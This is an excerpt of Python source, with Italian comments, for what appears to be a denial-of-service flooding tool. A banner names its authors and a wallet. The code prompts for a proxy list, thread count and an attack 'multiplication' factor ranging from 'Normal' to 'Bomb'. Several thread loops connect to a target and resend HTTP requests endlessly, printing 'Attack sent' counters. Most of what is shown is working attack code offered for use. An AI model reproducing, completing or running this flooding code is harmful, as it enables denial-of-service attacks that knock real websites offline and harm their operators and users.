...
try: # se si è sotto linux scapy (per l'attacco tcp-udp) funziona
	...
	print ("TCP/UDP/HTTP Flood Layer 4")
print('''
  ########### Miwz - API ##########
          FB : Kritt    Koron
          Wallet : 0980965521
...
def proxymode():
	global choice2
	choice2 = input("Do you want Attack Proxy/Socks mode? Answer [ y ] ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def proxylist():
	global proxies
	out_file = str(input("Enter the proxylist filename (proxy.txt): "))
	if out_file == "":
		out_file = "proxy.txt"
...
def multiplication():
	global multiple
	try:
		multiple = int(input("Insert a number of multiplication for the attack \n[1-5] Normal\n [50] Powerful\n [100] Bomb\n\nEnter : "))
	except ValueError:
		print("You mistyped, try again.\n")
		multiplication()
	begin()
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.send(p) # ed invia
				print ("Attack sant from " + str(proxy[0]+":"+proxy[1]) + " : ", self.counter) # print req + counter
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port))) # si connette
				s.send(p) # ed invia
				print ("Attack sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port))) # connessione
				s.send(p) # invio
				print ("Attack sent from " + str(proxy[0]+":"+proxy[1]) + " : ", self.counter) # req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
				...
				try:
					...
					s.connect((str(url2),int(port))) # connessione
					s.send(p) # invio
					print ("Attack sant from : ", self.counter) # req + counter
					try: # invia altre richieste nello stesso thread
						for y in range(multiple): # fattore di moltiplicazione
							s.send(str.encode(p)) # encode in bytes della richiesta HTTP
					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try: # il try per non far chiudere il programma se si verifica qualche errore
				...
				print ("Attack Sent! :", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True: # ciclo infinito
			try:
				...
				print ("Attack sent from " + str(proxy[0]+":"+proxy[1]) + " : ", self.counter) # print delle richieste
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
